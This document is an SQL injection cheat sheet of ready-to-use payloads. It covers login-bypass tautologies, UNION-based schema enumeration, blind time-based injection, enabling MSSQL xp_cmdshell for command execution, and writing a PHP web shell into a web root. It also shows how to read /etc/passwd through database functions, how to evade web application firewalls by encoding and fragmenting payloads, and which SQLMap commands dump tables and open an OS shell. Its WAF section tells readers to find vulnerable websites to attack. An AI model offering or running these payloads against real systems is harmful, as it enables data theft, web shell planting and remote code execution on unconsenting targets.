# SQL

## payloads

Tautology : To login bypass

```
' OR 1=1 -- //
```

Tautology : To get Version using Tautology

```
' or 1=1 in (select @@version) -- //
```

Order By : To find number of columns in the table

```
' ORDER BY 1-- //
```

Union : Using Order By, Enumerating the current database name, user, and MySQL version.
(adjust the columns according to the table. starting null and ending database())

```
' UNION SELECT null, null, database(), user(), @@version -- //
```

Union : retrieve the columns table from the information_schema

```
' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //
```

Blind SQL:

```
' AND IF (1=1, sleep(3),'false') -- //
```

Code Execution : xp_cmdshell in Microsoft SQL need to be enable to work this.

```
EXECUTE sp_configure 'show advanced options', 1;
RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

EXECUTE xp_cmdshell 'whoami'; //to run commands
```

Code Execution: Uploading an RCE to an Writable folder. (/var/www/html/). Adjust Code Accordingly.

```
' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
```

Command to execute RCE.
`http://<IP>/webshell.php?cmd=<command>`

### Reading files with postgres SQL

```
create table tmp(data text); copy tmp from '/etc/passwd'; select * from tmp;
```

```
select pg_read("/etc/passwd");
```


### Reading files with MySQL

```
select @@GLOBAL.secure_file_priv;
```

```
select * from users INTO OUTFILE 'path_we_got_from_above_query/read.txt';
```

```
select LOAD_FILE('file_path');
```

---

### RCE via MSSQL

```
'EXECUTE sp_configure 'show advanced options', 1;--
'RECONFIGURE;--
'EXECUTE sp_configure 'xp_cmdshell', 1;--
'RECONFIGURE;--
```

```
' EXECUTE xp_cmdshell 'command';--
```

---
## WAF Bypass

```
⚪To bypass a web application firewall (WAF) in SQL 

1. Exploit SQL Injection: Identify websites that may be vulnerable to SQL injection. SQLMap is a powerful tool that can automate the process of exploiting SQL injection vulnerabilities. Install SQLMap and provide it with the website's URL and parameters to carry out the attack.

2. Evade WAF Detection: WAFs are designed to detect and block suspicious SQL injection attempts. To evade detection, you can employ various techniques such as:

   - Obfuscation: Modify the payload by encoding or encrypting it to bypass signature-based detection.

   - Time-based Techniques: Construct queries that exploit time delays to evade pattern matching and signature-based detection.

   - Use Hex Encoding: Encode the payloads in hexadecimal format to bypass payload filters.

⚫Here's an Crafted payload in python for an Example:
     - Base64 encoding:
payload_encoded = base64.b64encode(payload.encode('utf-8'))
     - URL encoding:
payload_encoded = urllib.parse.quote(payload)

   - Fragmentation: Split the payload into smaller fragments to avoid WAF detection. For instance:
     -
payload_fragmented = payload[:10] + "'" + payload[10:]

   - Character substitution: Replace characters in the payload with alternatives that may bypass the WAF. For example:
     -
payload_substituted = payload.replace("SELECT", "S*ELECT")


⚪ Uploaded By - @MADARA888UCHIHAA 🍀
```

## SQLMap

```
An advanced Guide for SQL Injection (SQLi) using SQLMap👩‍💻:

1. Enumerate Database Information:
   - Identify the number of databases on the target: sqlmap -u <URL> --dbs
   - List all database names: sqlmap -u <URL> --dbs --batch
   - Enumerate tables in a specific database: sqlmap -u <URL> -D <database_name> --tables

2. Extract Table Data:
   - Dump all data in a specific table: sqlmap -u <URL> -D <database_name> -T <table_name> --dump

3. Exploiting SQLi Vulnerabilities:
   - Test for SQLi vulnerability: sqlmap -u <URL> --level 5 --risk 3
   - Specify injection point manually: sqlmap -u "<URL>?parameter=value" --sql-shell
   - Use custom headers: sqlmap -u <URL> --headers="User-Agent: CustomAgent"

4. OS Command Execution:
   - Execute operating system commands: sqlmap -u <URL> --os-shell

5. Brute-Force Techniques:
   - Brute-force table names: sqlmap -u <URL> -D <database_name> --tables --technique T
   - Brute-force column names: sqlmap -u <URL> -D <database_name> -T <table_name> --columns --technique T

6. Time-Based Exploitation:
   - Perform a time-based blind SQLi attack: sqlmap -u <URL> --time-sec 10 --technique T

7. Other Useful Techniques:
   - Retrieve the current user: sqlmap -u <URL> --current-user
   - Retrieve the current database: sqlmap -u <URL> --current-db
   - Identify database management system (DBMS): sqlmap -u <URL> --dbms

Uploaded By - @MADARA888UCHIHAA ⭐
```